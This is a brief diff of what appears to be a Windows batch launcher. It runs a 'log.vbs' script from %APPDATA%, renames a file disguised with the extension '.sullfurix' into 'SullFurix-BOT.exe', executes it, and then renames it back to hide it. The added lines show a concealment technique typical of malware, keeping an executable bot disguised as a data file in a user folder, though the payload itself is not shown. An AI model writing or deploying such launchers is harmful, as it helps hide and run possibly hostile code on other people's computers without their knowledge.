@@ -1,16 +1,12 @@
-%MYFILES%\log.vbs
+
+"%APPDATA%\log.vbs"
 
 timeout 3
 
+ren "%APPDATA%\data.sullfurix" "SullFurix-BOT.exe"
 
-ren "%MYFILES%\data.sullfurix" "SullFurix-BOT.exe"
+"%APPDATA%\SullFurix-BOT.exe"
 
-
-"%MYFILES%\SullFurix-BOT.exe"
-
-
-
-ren "%MYFILES%\SullFurix-BOT.exe" "data.sullfurix"
-
+ren "%APPDATA%\SullFurix-BOT.exe" "data.sullfurix"
 
 exit
